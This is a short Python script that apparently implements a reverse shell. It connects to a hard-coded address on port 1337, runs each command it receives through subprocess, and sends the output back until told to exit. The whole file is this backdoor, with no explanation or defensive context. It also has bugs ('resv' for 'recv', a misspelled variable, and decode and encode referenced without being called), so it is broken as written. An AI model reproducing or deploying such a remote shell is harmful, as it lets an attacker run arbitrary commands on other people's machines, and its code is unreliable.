import socket
import subprocess
sever = "192.168.0.0"
port = 1337
buffer = 1024
s = socket.socket()
s.connect((sever,port))
while True:
    command = s.resv(buffer).decode
    if command.lower() == "exit":
        break
    output = subprocess.getoutput(command)
    s.send(output.encode)
s.close()
